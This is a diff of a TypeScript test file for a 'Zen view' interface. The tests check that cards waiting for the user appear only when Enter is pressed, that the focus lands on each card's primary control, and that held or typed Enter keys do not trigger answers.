+	assert.ok(r.text().includes("Boss token needed to add the ACL"), "Enter took it");
 	r.feed(waitAndBox(r, true));
 	await r.advance(60_000);
 	assert.ok(r.text().includes("Boss token needed") && !r.text().includes("waydosoft asks you"), "never interrupted, untouched or not");
 	assert.deepEqual(r.calls.debug, [`[sb] a question from waydosoft waits and is not on the Zen page: ${WAIT_KEY} is on the screen`], "the console says once why the question is not on the page");
 	r.button("Maybe later")!.click();
 	await r.advance(PAUSE + 100);
-	assert.deepEqual(whoIs(r), ["waydosoft asks you"], "the question follows the pause");
-});
-
-test("ZBF-F001: a card that replaces another one (the unit asked a new question) is inert while the old card dissolves, so a tap or a key aimed at the old card cannot land on the new one", async () => {
-	server();
-	const r = rig();
-	const ask = (digest: string) => linkNet({ alerts: [{ ...BOX(), data: { ...BOX().data, digest: digest.repeat(64) } }] }); // the same dialog id, another question
-	r.feed(ask("a"));
-	r.z.show();
+	assert.equal(cards(r), 0, "the question does not follow the pause by itself");
+	r.z.key("talk");
 	await r.settle();
-	assert.equal(inertAt(liveCard(r)), false, "the first card is live at once");
-	r.feed(ask("b"));
-	assert.equal(r.by((el) => el.getAttribute("data-gone") !== null).length, 1, "the old card is still drawn, dissolving");
-	assert.equal(inertAt(liveCard(r)), true, "the new one answers nothing yet");
-	await r.advance(1400);
-	assert.equal(inertAt(liveCard(r)), false, "the dissolve ended");
+	assert.deepEqual(whoIs(r), ["waydosoft asks you"], "it comes by Enter");
 });
-
-const liveCard = (r: ReturnType<typeof rig>) => r.by((el) => el.classes.has("zen-card") && el.getAttribute("data-gone") === null)[0]!;
-const inertAt = (el: El | undefined) => { for (let e = el; e; e = e.parent) if (e.hasAttribute("inert")) return true; return false; };
 
 // #93 (Zen part, boss 2026-11-06: 「zen mode 則不理這些回報」): an ally base's unit-status report and a Straw Link notice are not Zen items; only a real question a box forwarded is.
 test("#93: an ally base's unit-status report and a Link notice are no item in Zen: no card, no cue count, no chime, no change of the breath; a forwarded question still counts", async () => {
@@ -2176,4 +2343,235 @@ test("#93: an ally base's unit-status report and a Link notice are no item in Ze
 	assert.equal(r.by((el) => el.classes.has("zen-circle"))[0], circle, "the circle is the one it was: nothing redrew it");
 	r.feed(ally({ alerts: [notice, BOX()], units: reports }));
 	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.", "the box's real question is the one card");
+});
+
+// --- Z-D20 (docs/specs/2026-11-01-zen-view.md, Never interrupted; boss 2026-11-06 on 0.60.2): a card is taken by the boss and never comes or goes by itself; Enter presses the primary control of every card ---------------------------------
+
+const TRUST_NET = () => net([], [TRUST]);
+/** Each kind of card with the control that Enter must find: the card's primary control, which takes the focus when the card is taken. */
+const KINDS: [string, (r: ReturnType<typeof rig>) => void, (r: ReturnType<typeof rig>) => unknown][] = [
+	["a unit's dialog", (r) => r.feed(net([unit("a", "waiting", { since: 5, pending: select() })])), (r) => r.by((el) => el.getAttribute("role") === "radio")[0]],
+	["a unit that waits on a terminal prompt (the words)", (r) => r.feed(net([unit("a", "waiting", { name: "docs-main", since: 5 })])), (r) => r.button("Open the terminal")],
+	["a project trust question", (r) => r.feed(TRUST_NET()), (r) => r.button("Trust")],
+	["a tower's wait", (r) => r.feed(waitNet(r)), (r) => r.button("Handle")],
+	["a teammate's confirm", (r) => r.feed(linkNet({ confirms: [CONFIRM] })), (r) => r.button("Allow")],
+	["a memory proposal", (r) => r.feed(linkNet({ proposals: [PROPOSAL] })), (r) => r.button("Confirm")],
+	["a pair request", (r) => (r.feed(linkNet()), r.z.pairs([PAIR])), (r) => r.by((el) => el.classes.has("zen-pair-number"))[0]],
+	["a question a box forwarded", (r) => r.feed(linkNet({ alerts: [FWD()] })), (r) => r.by((el) => el.getAttribute("role") === "radio")[0]],
+];
+
+test("Z-D20: Enter takes a card and the focus lands on its primary control, for every kind of card: the choice, Open the terminal, Trust, Handle, Allow, Confirm, the pair's number; none was focused before", async () => {
+	server();
+	for (const [name, feed, primary] of KINDS) {
+		const r = rig({ start: null });
+		feed(r);
+		r.z.show();
+		await r.settle();
+		assert.equal(cards(r), 0, `${name}: it waits`);
+		assert.equal(page.focused, undefined, `${name}: nothing took the focus`);
+		assert.equal(r.z.key("talk"), true, `${name}: Enter is Zen's`);
+		await r.settle();
+		assert.equal(cards(r), 1, name);
+		assert.ok(primary(r), `${name}: its primary control exists`);
+		assert.equal(page.focused, primary(r), `${name}: the focus is on it, so the next Enter presses it`);
+	}
+});
+
+test("Z-D20: Enter on a card with no control focused (the focus was lost) goes to its primary control; it presses nothing by itself", async () => {
+	const sent = server();
+	for (const [name, feed, primary] of KINDS) {
+		const r = rig({ start: null });
+		feed(r);
+		r.z.show();
+		await r.settle();
+		r.z.key("talk");
+		await r.settle();
+		page.focused = undefined; // a click on the blank space
+		assert.equal(r.z.key("talk"), true, `${name}: Enter is Zen's again`);
+		assert.equal(page.focused, primary(r), name);
+	}
+	assert.deepEqual(sent, [], "and no answer was sent by any of them");
+});
+
+test("Z-D20: a held Enter does not press the card's button over and over: the key's repeats that arrive on the card are kept from it, a fresh press is not", async () => {
+	server();
+	const r = rig({ start: null });
+	r.feed(linkNet({ confirms: [CONFIRM] }));
+	r.z.show();
+	await r.settle();
+	r.z.key("talk"); // the Enter that takes the card ...
+	await r.settle();
+	const allow = r.button("Allow")!;
+	let prevented = 0;
+	allow.bubble("keydown", { key: "Enter", repeat: true, preventDefault: () => void prevented++ }); // ... is held: its repeats arrive on Allow
+	assert.equal(prevented, 1, "a repeat of Enter on a button is prevented, so the browser does not click it");
+	allow.bubble("keydown", { key: "Enter", repeat: false, preventDefault: () => void prevented++ });
+	assert.equal(prevented, 1, "a fresh press is the button's");
+	allow.bubble("keydown", { key: " ", repeat: true, preventDefault: () => void prevented++ });
+	assert.equal(prevented, 1, "only Enter is held back");
+});
+
+test("Z-D20: Enter never fires while a text field has the focus: the companion's box, the head's input, a terminal's sink, a contenteditable keep it for typing, and a button keeps its own", async () => {
+	server();
+	const r = rig();
+	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
+	r.z.show();
+	await r.settle();
+	assert.equal(cards(r), 0);
+	const target = (tag: string, cls: string[] = [], attrs: Record<string, string> = {}) => { const el = new El(tag); el.setAttribute("class", cls.join(" ")); for (const [k, v] of Object.entries(attrs)) el.setAttribute(k, v); return el; };
+	const typing = [r.calls.composers.at(-1)!.box, target("input"), target("textarea", ["term-sink"]), target("div", ["term-scroll"]), Object.assign(target("div"), { isContentEditable: true })];
+	for (const at of typing) assert.equal(hotkeyOf({ key: "Enter", ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target: at }, false, false, "zen"), undefined, `${at.tagName}: Enter is typing`);
+	assert.equal(hotkeyOf({ key: "Enter", ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target: target("button") }, false, false, "zen"), undefined, "a button keeps its Enter");
+	assert.equal(hotkeyOf({ key: "Enter", ctrlKey: false, altKey: false, metaKey: false, isComposing: false, defaultPrevented: false, target: r.root }, false, false, "zen"), "talk", "off a field, on the companion's screen, Enter takes the card");
+	assert.equal(cards(r), 0, "none of those took it");
+	assert.equal(r.z.key("talk"), true);
+	await r.settle();
+	assert.equal(cards(r), 1, "only the key off a field did");
+});
+
+test("Z-D20: a card on the screen is never replaced by another one that arrives, a blocking question included: the same card, nothing dissolves, no sound, the cue is not on it", async () => {
+	server();
+	const r = rig({ start: null });
+	r.feed(waitNet(r));
+	r.z.show();
+	await r.settle();
+	r.z.key("talk");
+	await r.settle();
+	const card = r.by((el) => el.classes.has("zen-card"))[0]!;
+	r.feed(waitAndBox(r, true)); // a blocking question arrives behind it
+	await r.advance(5 * 60_000);
+	assert.equal(r.by((el) => el.classes.has("zen-card"))[0], card, "the same card");
+	assert.equal(r.by((el) => el.getAttribute("data-gone") !== null).length, 0, "nothing is dissolving");
+	assert.deepEqual(r.calls.sound, ["bowl"], "the one bowl of taking it");
+	assert.equal(cueText(r) ?? "", "", "no count on a card (Z-D3)");
+	assert.ok(!r.text().includes("waydosoft"), "nothing of the other");
+});
+
+test("Z-D20: a card whose question ended while it is shown stays, saying so, with every answer off and one button, Back to the breath; the knock rings once and the card is the boss's to close", async () => {
+	server();
+	const r = rig({ start: null });
+	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ cancel: true }) })]));
+	r.z.show();
+	await r.settle();
+	r.z.key("talk");
+	await r.settle();
+	r.feed(net([unit("a", "working", { name: "ops-main", since: 5 })])); // answered in the terminal
+	await r.settle();
+	assert.equal(cards(r), 1, "the card is still there");
+	assert.ok(r.text().includes("Robot Hand"), "with the question the boss was reading");
+	assert.ok(r.text().includes("Already answered elsewhere"), "saying it is settled");
+	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
+	assert.ok(r.by((el) => el.getAttribute("role") === "radio").every((o) => o.disabled) && r.button("Send answer")!.disabled && r.button("Cancel")!.disabled, "nothing on it answers");
+	assert.equal(r.button("Maybe later"), undefined, "Maybe later is not what it offers");
+	const close = r.button("Back to the breath")!;
+	assert.ok(close && !close.disabled, "one button");
+	assert.equal(page.focused, close, "the focus is on it: Enter closes");
+	await r.advance(60 * 60_000);
+	assert.equal(cards(r), 1, "an hour later it is still there");
+	assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
+	assert.equal(r.by((el) => el.classes.has("zen-circle")).length, 0, "no pause and no circle came by themselves");
+});
+
+test("Z-D20: a card that ended is closed by Enter (with the focus anywhere off a control), Esc, and a tap on its button; then the pause, then the breath; the unit's next question waits for Enter", async () => {
+	server();
+	const ended = async (how: (r: ReturnType<typeof rig>) => unknown) => {
+		const r = rig({ start: null });
+		r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
+		r.z.show();
+		await r.settle();
+		r.z.key("talk");
+		await r.settle();
+		r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select({ dialog: "d2" }) })])); // it asked another question
+		await r.settle();
+		assert.equal(cards(r), 1, "the card stays");
+		assert.deepEqual(r.calls.sound, ["bowl", "knock"]);
+		how(r);
+		await r.settle();
+		assert.equal(cards(r) + r.by((el) => el.getAttribute("data-gone") !== null).length, r.by((el) => el.getAttribute("data-gone") !== null).length, "closed: the card dissolves");
+		assert.ok(r.by((el) => el.getAttribute("role") === "img").length, "the pause");
+		await r.advance(3100);
+		assert.equal(cards(r), 0, "the unit's next question does not take the screen after the pause");
+		assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
+		r.z.key("talk");
+		await r.settle();
+		assert.equal(cards(r), 1, "Enter takes it");
+		assert.equal(r.by((el) => el.getAttribute("role") === "radio").length, 3, "it is the new question, answerable");
+	};
+	await ended((r) => { page.focused = undefined; assert.equal(r.z.key("talk"), true); }); // Enter
+	await ended((r) => assert.equal(escape(r), true)); // Esc
+	await ended((r) => r.button("Back to the breath")!.click()); // a tap
+});
+
+test("Z-D20: a card whose unit failed stays with the error line and the low bowl until the boss closes it; one whose snapshot gap ended is live again, with no second sound", async () => {
+	server();
+	const r = rig({ start: null });
+	r.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
+	r.z.show();
+	await r.settle();
+	r.z.key("talk");
+	await r.settle();
+	r.feed(net([unit("a", "error", { name: "ops-main", since: 5 })]));
+	await r.advance(60_000);
+	assert.equal(cards(r), 1);
+	assert.deepEqual(r.calls.sound, ["bowl", "low"]);
+	assert.ok(r.button("Back to the breath"));
+	const gap = rig({ start: null });
+	gap.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
+	gap.z.show();
+	await gap.settle();
+	gap.z.key("talk");
+	await gap.settle();
+	gap.feed(net([]));
+	await gap.settle();
+	assert.ok(gap.text().includes("Already answered elsewhere"), "a unit missing from a snapshot: the card says so");
+	gap.feed(net([unit("a", "waiting", { name: "ops-main", since: 5, pending: select() })]));
+	await gap.settle();
+	assert.ok(!gap.text().includes("Already answered elsewhere") && gap.by((el) => el.getAttribute("role") === "radio").every((o) => !o.disabled) && gap.button("Maybe later"), "the question is listed again: the card is live again");
+	assert.deepEqual(gap.calls.sound, ["bowl"], "a unit that left the net rings nothing");
+});
+
+test("Z-D20: the terminal layer is never closed or replaced by a card that arrives: the layer stays, nothing is drawn under it, and the card waits for Enter when Zen is back", async () => {
+	server();
+	const r = rig(); // a session for company: the screen under the layer where a card used to take the screen by itself
+	r.feed(net([unit("m", "working")]));
+	r.z.show();
+	await r.settle();
+	r.z.terminal({ key: "m" });
+	await new Promise((done) => setImmediate(done));
+	const layer = () => r.by((el) => el.classes.has("zen-term"))[0];
+	assert.ok(layer(), "the layer is on");
+	r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() })]));
+	await r.advance(60_000);
+	assert.ok(layer(), "the layer stays");
+	assert.equal(cards(r), 0, "no card was drawn under it");
+	assert.deepEqual(r.calls.sound, [], "no bowl");
+	r.by((el) => el.classes.has("zen-term-back"))[0]!.click();
+	await r.settle();
+	assert.equal(layer(), undefined);
+	assert.equal(cards(r), 0, "back in Zen the card still waits for Enter");
+	assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
+	r.z.key("talk");
+	await r.settle();
+	assert.equal(cards(r), 1);
+});
+
+test("Z-D20 (box trial C, 10:38): a card that resolves while it queues never renders and never sounds, on the circle or with a session for company; the cue drops to what still waits", async () => {
+	server();
+	for (const mk of [() => rig({ start: null }), () => rig()]) {
+		const r = mk();
+		r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })]));
+		r.z.show();
+		await r.settle();
+		assert.equal(cueText(r), "2 cards wait for Enter. No rush, when you're ready.");
+		for (const gone of [net([unit("m", "working"), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })]), net([unit("m", "working"), unit("a", "working", { since: 5 }), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })])]) {
+			r.feed(gone);
+			await r.advance(5000);
+			assert.equal(cards(r), 0, "the card that resolved while queued is never drawn");
+			assert.deepEqual(r.calls.sound, [], "no bowl, no knock");
+			assert.equal(cueText(r), "1 card waits for Enter. No rush, when you're ready.");
+			r.feed(net([unit("m", "working"), unit("a", "waiting", { since: 5, pending: select() }), unit("b", "waiting", { since: 9, pending: select({ dialog: "d2" }) })]));
+			await r.settle();
+		}
+		assert.equal(r.by((el) => el.getAttribute("data-gone") !== null).length, 0, "nothing faded in or out");
+	}
 });
